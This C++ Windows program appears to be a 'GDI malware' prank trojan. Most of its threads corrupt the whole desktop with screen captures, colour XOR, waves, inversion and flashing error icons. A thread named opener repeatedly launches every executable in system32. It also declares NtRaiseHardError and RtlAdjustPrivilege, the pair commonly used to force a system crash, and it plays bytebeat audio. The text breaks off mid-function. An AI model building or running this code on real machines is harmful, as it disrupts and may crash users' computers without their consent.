typedef struct IUnknown IUnknown;
#define NOMINMAX
#include <windows.h>
#include <iostream>
#define _USE_MATH_DEFINES 1
#include <cmath>
#include <algorithm>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#define M_PI 3.14159265358979323846264338327950288
#pragma comment(lib, "Msimg32.lib")
#define RGBBRUSH (DWORD)0x1900ac010e
#define SRCBSH (DWORD)0x89345c
#define CUSRGB(r, g, b) (r | g << 8 | g << 16)
#define cmin(a, b) ((a) < (b) ? (a) : (b))
#define cmax(a, b) ((a) > (b) ? (a) : (b))
struct V3 { float x, y, z; };
struct P2 { int x, y; };
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
HDC g_hdcScreen = NULL;
HDC g_hdcMem = NULL;
HBITMAP g_hBmp = NULL;
RGBQUAD* g_rgbScreen = NULL;
int g_w = 0;
int g_h = 0;
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635b, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5, r = n, n & 0x7fffffff; }
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Uuid.lib")

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef struct {
	float h;
	float s;
	float l;
} HSL;

float smoothstep(float a, float b, float x) {
	float t = (x - a) / (b - a);
	if (t < 0)t = 0;
	if (t > 1)t = 1;
	return t * t * (3 - 2 * t);
}


float hue2rgb(float p, float q, float t)
{
	if (t < 0.0f) t += 1.0f;
	if (t > 1.0f) t -= 1.0f;
	if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
	if (t < 1.0f / 2.0f) return q;
	if (t < 2.0f / 3.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
	return p;
}


HSL rgb2hsl(RGBQUAD px) {
	HSL out;
	float R = px.rgbRed / 255.0f;
	float G = px.rgbGreen / 255.0f;
	float B = px.rgbBlue / 255.0f;

	float maxv = fmaxf(R, fmaxf(G, B));
	float minv = fminf(R, fminf(G, B));
	float delta = maxv - minv;

	out.l = (maxv + minv) * 0.5f;

	if (delta < 0.00001f) {
		out.h = 0.0f;
		out.s = 0.0f;
		return out;
	}

	out.s = (out.l < 0.5f)
		? (delta / (maxv + minv))
		: (delta / (2.0f - maxv - minv));

	if (maxv == R)
		out.h = (G - B) / delta;
	else if (maxv == G)
		out.h = 2.0f + (B - R) / delta;
	else
		out.h = 4.0f + (R - G) / delta;

	out.h *= 60.0f;
	if (out.h < 0.0f) out.h += 360.0f;

	return out;
}

void HSLtoRGB(float H, float S, float L, int* r, int* g, int* b) {
	float R, G, B;

	H = fmodf(H, 360.0f);
	if (H < 0.0f) H += 360.0f;
	H /= 360.0f;

	if (S <= 0.0f) {
		R = G = B = L;
	}
	else {
		float q = (L < 0.5f) ? (L * (1.0f + S)) : (L + S - L * S);
		float p = 2.0f * L - q;

		R = hue2rgb(p, q, H + 1.0f / 3.0f);
		G = hue2rgb(p, q, H);
		B = hue2rgb(p, q, H - 1.0f / 3.0f);
	}

	*r = (int)(R * 255.0f);
	*g = (int)(G * 255.0f);
	*b = (int)(B * 255.0f);
}

RGBQUAD hsl2rgb(HSL hsl) {
	int r, g, b;
	HSLtoRGB(hsl.h, hsl.s, hsl.l, &r, &g, &b);

	RGBQUAD out;
	out.rgbRed = (BYTE)r;
	out.rgbGreen = (BYTE)g;
	out.rgbBlue = (BYTE)b;
	out.rgbReserved = 0;
	return out;
}



int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

DWORD WINAPI opener(LPVOID lpParam) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
	while (true) {
		HANDLE find = FindFirstFileW(path, &data);
		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(rand() % 10000);
		}
	}
}

DWORD WINAPI shader1(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double moveangle = 0;
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		int ax = (int)(cos(moveangle) * 5.0);
		int ay = (int)(sin(moveangle) * 5.0);
		int w = xorshift32() % sh, h = sh / 2 - xorshift32() % sh / 3;
		BitBlt(desk, ax, ay, sw, sh, desk, 0, 0, SRCCOPY);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		Sleep(xorshift32() % 100);
	}
}

DWORD WINAPI shader1or1(LPVOID lpParam) {
	const int width = GetSystemMetrics(0), height = GetSystemMetrics(1);

	HWND laywin = CreateWindowExA(
		WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TRANSPARENT | WS_EX_TOPMOST,
		"STATIC", "gdi distortion", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL
	);

	POINT winpos = { 0, 0 };
	SIZE winsize = { width, height };

	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	bmi.bmiHeader.biWidth = width;
	bmi.bmiHeader.biHeight = height;
	bmi.bmiHeader.biPlanes = 1;

	RGBQUAD* pixels;
	RGBQUAD* pixels_copy = (RGBQUAD*)malloc(width * height * sizeof(RGBQUAD));
	RGBQUAD* src = (RGBQUAD*)VirtualAlloc(0, width * height * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	HDC hdc = GetDC(0);
	HDC memdc = CreateCompatibleDC(hdc);
	HBITMAP hbit = CreateDIBSection(hdc, &bmi, 0, (void**)&pixels, 0, 0);
	SelectObject(memdc, hbit);

	int t = 0;
	int col = 0;
	int y0 = 0;
	int x0 = 0;
	int time = 0;
	int xc = width / 2;
	int yc = height / 2;
	int angle = 0;
	while (true)
	{
		BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
		memcpy(pixels_copy, pixels, width * height * 4);
		(DWORD*)col;

		for (int y = 0; y < height; y++)
		{
			for (int x = 0; x < width; x++)
			{
				int desty = yc + (x - xc) * sin(angle * (M_PI / 70)) + (y - yc) * cos(angle * (M_PI / 70));
				int destX = xc + (x - xc) * cos(angle * (M_PI / 70)) - (y - yc) * sin(angle * (M_PI / 70));
				int sx = x + (int)destX;
				destX += width;
				destX %= width;
				desty += height;
				desty %= height;
				pixels[y * width + x] = pixels_copy[desty * width + destX];
			}
		}

		angle++;

		UpdateLayeredWindow(laywin, hdc, &winpos, &winsize, memdc, &winpos, 0, NULL, ULW_OPAQUE);
		SetWindowPos(laywin, HWND_TOPMOST, 0, 0, 0, 0, SWP_SHOWWINDOW | SWP_NOSIZE | SWP_NOMOVE);
	}

	ReleaseDC(0, hdc);
	DeleteDC(memdc);
	DeleteObject(hbit);
	DestroyWindow(laywin);
	free(pixels_copy);
}

DWORD WINAPI shader1or2(LPVOID lpThread) {
	HDC sdc = GetDC(NULL);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bi;
	ZeroMemory(&bi, sizeof(bi));
	bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bi.bmiHeader.biWidth = sw;
	bi.bmiHeader.biHeight = -sh;
	bi.bmiHeader.biPlanes = 1;
	bi.bmiHeader.biBitCount = 32;
	bi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* buf;
	HBITMAP bmp = CreateDIBSection(sdc, &bi, DIB_RGB_COLORS, (void**)&buf, NULL, 0);
	HDC mdc = CreateCompatibleDC(sdc);
	SelectObject(mdc, bmp);

	float shift = 0.0f;

	while (1) {
		BitBlt(mdc, 0, 0, sw, sh, sdc, 0, 0, SRCCOPY);

		shift += 1.0f;
		if (shift >= 360.0f) shift -= 360.0f;

		int count = sw * sh;

		for (int i = 0; i < count; i++) {
			HSL hsl = rgb2hsl(buf[i]);

			hsl.h += shift;
			if (hsl.h >= 360.0f) hsl.h -= 360.0f;
			if (hsl.h < 0.0f) hsl.h += 360.0f;

			buf[i] = hsl2rgb(hsl);
		}

		BitBlt(sdc, 0, 0, sw, sh, mdc, 0, 0, SRCERASE);
		Sleep(1);
	}

	return 0;
}

DWORD WINAPI refreshshad1(LPVOID lpThread) {
	while (true) {
		Sleep(320);
		InvalidateRect(NULL, NULL, TRUE);
	}
	Sleep(320);
	InvalidateRect(NULL, NULL, TRUE);
}

DWORD WINAPI shader2(LPVOID lpThread)
{
	HDC sdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bi;
	ZeroMemory(&bi, sizeof(bi));
	bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bi.bmiHeader.biWidth = w;
	bi.bmiHeader.biHeight = -h;
	bi.bmiHeader.biPlanes = 1;
	bi.bmiHeader.biBitCount = 32;
	bi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* buf;
	HBITMAP bmp = CreateDIBSection(sdc, &bi, DIB_RGB_COLORS, (void**)&buf, NULL, 0);
	HDC mdc = CreateCompatibleDC(sdc);
	SelectObject(mdc, bmp);

	float vLeft = 0.0f;
	float vRight = 0.0f;

	int half = w / 2;

	while (1)
	{
		BitBlt(mdc, 0, 0, w, h, sdc, 0, 0, SRCCOPY);

		vLeft += 2.0f;
		vRight -= 2.0f;

		if (vLeft >= w) vLeft -= w;
		if (vRight <= -w) vRight += w;

		BitBlt(sdc, 0, 0, half, h, mdc, (int)vRight, 0, SRCCOPY);
		BitBlt(sdc, 0, 0, half, h, mdc, (int)(vLeft - w), 0, SRCCOPY);

		BitBlt(sdc, half, 0, half, h, mdc, (int)vLeft, 0, SRCCOPY);
		BitBlt(sdc, half, 0, half, h, mdc, (int)(vRight + w), 0, SRCCOPY);

		Sleep(1);
	}

	return 0;
}

DWORD WINAPI payload2(LPVOID lpParam) {
	while (1) {
		HDC hdcDesktop = GetDC(HWND_DESKTOP);
		HDC hdcMem = CreateCompatibleDC(hdcDesktop);
		INT w = GetSystemMetrics(SM_CXSCREEN);
		INT h = GetSystemMetrics(SM_CYSCREEN);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdcDesktop, w, h);
		SelectObject(hdcMem, hBitmap);

		HBRUSH brush = CreateSolidBrush(RGB(rand() % 25, rand() % 142, rand() % 255));
		SelectObject(hdcDesktop, brush);

		int i = 1 + rand() % 32;

		SetStretchBltMode(hdcDesktop, STRETCH_HALFTONE);
		SetStretchBltMode(hdcMem, STRETCH_HALFTONE);

		StretchBlt(hdcMem, 0, 0, w / i, h / i, hdcDesktop, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdcDesktop, 0, 0, w, h, hdcMem, 0, 0, w / i, h / i, SRCCOPY);
		BitBlt(hdcDesktop, 0, 0, w, h, hdcDesktop, 0, 0, PATINVERT);
		BitBlt(hdcDesktop, rand() % 10, rand() % 10, w, h, hdcDesktop, rand() % 10, rand() % 10, SRCCOPY);
		ReleaseDC(NULL, hdcDesktop);
		DeleteObject(hBitmap);
		DeleteObject(brush);
		DeleteDC(hdcMem);
	}
}

DWORD WINAPI shader3(LPVOID lpParam) {
	HDC s = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	HDC memA = CreateCompatibleDC(s);
	HDC memB = CreateCompatibleDC(s);

	HBITMAP bmpA = CreateCompatibleBitmap(s, w, h);
	HBITMAP bmpB = CreateCompatibleBitmap(s, w, h);

	SelectObject(memA, bmpA);
	SelectObject(memB, bmpB);

	BitBlt(memA, 0, 0, w, h, s, 0, 0, SRCCOPY);

	int speed = 30;
	int dir = rand() % 8;
	DWORD last = GetTickCount();

	while (1)
	{
		int dx = 0, dy = 0;
		if (dir == 0) dx = -speed;
		if (dir == 1) dx = speed;
		if (dir == 2) dy = -speed;
		if (dir == 3) dy = speed;
		if (dir == 4) { dx = -speed; dy = -speed; }
		if (dir == 5) { dx = speed; dy = -speed; }
		if (dir == 6) { dx = -speed; dy = speed; }
		if (dir == 7) { dx = speed; dy = speed; }

		BitBlt(memB, 0, 0, w, h, memA, dx, dy, SRCCOPY);

		if (dx < 0) BitBlt(memB, w + dx, 0, -dx, h, memA, 0, 0, SRCCOPY);
		if (dx > 0) BitBlt(memB, 0, 0, dx, h, memA, w - dx, 0, SRCCOPY);

		if (dy < 0) BitBlt(memB, 0, h + dy, w, -dy, memA, 0, 0, SRCCOPY);
		if (dy > 0) BitBlt(memB, 0, 0, w, dy, memA, 0, h - dy, SRCCOPY);

		BitBlt(s, 0, 0, w, h, memB, 0, 0, SRCCOPY);

		HDC tmp = memA;
		memA = memB;
		memB = tmp;

		if (GetTickCount() - last >= 600)
		{
			dir = rand() % 8;
			last = GetTickCount();
		}
		Sleep(150);
	}

	return 0;
}

DWORD WINAPI shader3or1(LPVOID lpParam) { // credits to malvareking and ultradasher965
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r += x ^ y >> 3 * 2 ^ x & y;
			rgbScreen[i].g += (x ^ y >> 3 * 2 ^ x & y) / 2;
			rgbScreen[i].b += 0;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r += x ^ y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader4or1(LPVOID lpParam) {
	while (1) {
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), xSize = sw / 6, ySize = 8;
		HDC hdc;
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sw + 10; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, PATINVERT);
		}
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
		AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
		Sleep(1);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
	}
}

DWORD WINAPI shader4or2(LPVOID lpParam) {
	while (1) {
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), xSize = sw / 6, ySize = 8;
		HDC hdc;
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sw + 10; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCCOPY);
		}
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
		AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
		Sleep(1);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
	}
}

DWORD WINAPI shader5(LPVOID lpParam) {
	while (1) {
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), xSize = sw / 6, ySize = 8;
		HDC hdc;
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sw + 10; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCCOPY);
		}
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
		AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
		Sleep(1);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
	}
}

DWORD WINAPI shader5or1(LPVOID lpParam)
{
	while (1) {
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN),
			h = GetSystemMetrics(SM_CYSCREEN);

		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(NULL, hdc);
	}
}

DWORD WINAPI shader6(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	int z = 0;
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, NOTSRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = (x ^ y * 65280) + z;
		}
		z++;
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, w, h, blend);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader6or1(LPVOID lpThread) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	HDC hdc = GetDC(0);
	HDC mem = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(mem, bmp);
	int radiusGrow = 5;
	int amount = rand() % 8;
	int Timeout = 1;

	static struct {
		int x, y;
		int r;
	} rings[1024];

	for (int i = 0; i < amount; i++) {
		rings[i].x = rand() % w;
		rings[i].y = rand() % h;
		rings[i].r = 0;
	}

	while (1) {

		for (int i = 0; i < amount; i++) {

			int x = rings[i].x;
			int y = rings[i].y;
			int rr = rings[i].r;

			for (float a = 0; a < 6.28318f; a += 0.35f) {

				int ix = x + (int)(cosf(a) * rr);
				int iy = y + (int)(sinf(a) * rr);

				int r = rand() % 2;
				HICON icon =
					(r == 0) ? LoadIcon(NULL, IDI_ERROR) :
					(r == 1) ? LoadIcon(NULL, IDI_ERROR) :
					(r == 2) ? LoadIcon(NULL, IDI_ERROR) :
					LoadIcon(NULL, IDI_ERROR);

				DrawIconEx(hdc, ix - 16, iy - 16, icon, 32, 32, 0, 0, DI_NORMAL);
			}

			DrawIconEx(hdc, x - 16, y - 16, LoadIcon(NULL, IDI_WARNING), 32, 32, 0, 0, DI_NORMAL);


			rings[i].r += radiusGrow;


			if (rings[i].r > (w > h ? w : h)) {
				rings[i].r = 0;
				rings[i].x = rand() % w;
				rings[i].y = rand() % h;
			}
		}

		Sleep(Timeout);

	}
	return 0;
}

DWORD WINAPI shader7(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb -= y + x >> y * 23;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		BitBlt(hdcScreen, rand() % 7, rand() % 2, w, h, hdcScreen, rand() % 3, rand() % 6, SRCPAINT);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader8(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int fx = sqrt(x | y);
			rgbScreen[i].b -= fx;
			rgbScreen[i].g -= fx + 32;
			rgbScreen[i].r -= fx + 64;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		BitBlt(hdcScreen, rand() % 5, rand() % 2, rand() % w, rand() % h, hdcScreen, rand() % 3, rand() % 7, SRCCOPY);
		BitBlt(hdcScreen, rand() % 5, rand() % 10, w, h, hdcScreen, rand() % 10, rand() % 5, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader9(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int fx = sqrt((x ^ y) + x);
			rgbScreen[i].b = fx;
			rgbScreen[i].g -= fx ^ 32;
			rgbScreen[i].r = fx + 64;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		BitBlt(hdcScreen, rand() % 20, rand() % 20, w, h, hdcScreen, rand() % 20, rand() % 20, SRCAND);
		BitBlt(hdcScreen, 3, 7, w, h, hdcScreen, 5, 3, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader10(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int fx = sqrt((x ^ y) + y);
			rgbScreen[i].b ^= fx;
			rgbScreen[i].g -= fx;
			rgbScreen[i].r *= fx;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		StretchBlt(hdcScreen, 2, 2, w - 5, h - 5, hdcScreen, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdcScreen, -2, -2, w + 5, h + 5, hdcScreen, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
void sound1(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			(t >> 8) * (t >> 4) ^ (t * 1) & (t * 8)
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound2(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
